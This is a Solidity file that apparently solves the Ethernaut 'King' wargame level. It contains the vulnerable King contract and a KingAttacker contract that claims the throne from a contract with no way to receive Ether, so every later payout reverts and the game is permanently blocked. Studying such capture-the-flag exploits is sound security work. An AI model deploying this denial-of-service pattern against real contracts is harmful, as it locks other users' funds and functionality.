// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingAttacker {
    address public immutable kingAddress;

    constructor(address _kingAddress) payable {
        kingAddress = payable(_kingAddress);
    }

    function attack(uint256 amount) public payable {
        (bool sent, ) = kingAddress.call{value: amount, gas: 4000000}("");
        require(sent, "Failed to send Ether");
    }
}
